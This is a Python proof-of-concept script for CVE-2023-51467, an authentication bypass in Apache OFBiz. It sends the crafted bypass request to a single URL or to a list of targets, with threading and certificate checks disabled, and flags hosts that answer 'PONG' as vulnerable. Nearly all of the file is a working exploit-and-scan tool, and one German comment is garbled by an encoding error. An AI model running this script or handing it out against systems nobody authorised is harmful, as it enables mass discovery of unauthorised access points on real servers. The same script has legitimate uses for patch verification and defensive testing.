#!/bin/python3

import argparse
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from alive_progress import alive_bar
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
color = Console()

def print_error(message):
    color.print(f"[red][ERROR][/red] {message}")

def print_success(message):
    color.print(f"[green][SUCCESS][/green] {message}")

def detect_CVE_2023_51467(target):
    vulnerable = "PONG"
    vuln_path = '/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y'
    try:
        send_get = requests.get(target + vuln_path, timeout=5, verify=False)
        send_get.raise_for_status()
        if send_get.status_code == 200 and vulnerable in send_get.text:
            print_success(f"{target}{vuln_path} is vulnerable to CVE-2023-51467")
    except requests.RequestException as e:
        print_error(f"An error occurred while scanning {target}: {e}")

def scan_from_file(target_file, threads):
    try:
        with open(target_file, 'r') as url_file:
            urls = [url.strip() for url in url_file]
            if not urls:
                print_error("No targets found in the file.")
                return

            completed_tasks = []
            failed_tasks = []

            with ThreadPoolExecutor(max_workers=threads) as executor:
                with alive_bar(len(urls), title='Scanning Targets', bar='classic', enrich_print=False) as bar:
                    future_to_url = {executor.submit(detect_CVE_2023_51467, target): target for target in urls}

                    for future in as_completed(future_to_url):
                        target = future_to_url[future]
                        try:
                            future.result()
                            completed_tasks.append(target)
                        except Exception as e:
                            failed_tasks.append((target, e))
                            print_error(f"An error occurred while scanning {target}: {e}")
                        bar()

    except FileNotFoundError:
        print_error("File not found.")
    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description='A PoC for CVE-2023-51467 - Apache OFBiz Authentication Bypass')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-f', '--file', help='File containing target URLs to scan')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads for scanning')
    args = parser.parse_args()

    if args.url:
        url = args.url
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url  # FÃ¼ge "http://" hinzu, wenn es fehlt
        try:
            requests.get(url, timeout=5)  # Teste die Erreichbarkeit der URL
            detect_CVE_2023_51467(url)
        except requests.RequestException as e:
            print_error(f"An error occurred while testing the URL {url}: {e}")

    elif args.file:
        scan_from_file(args.file, args.threads)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
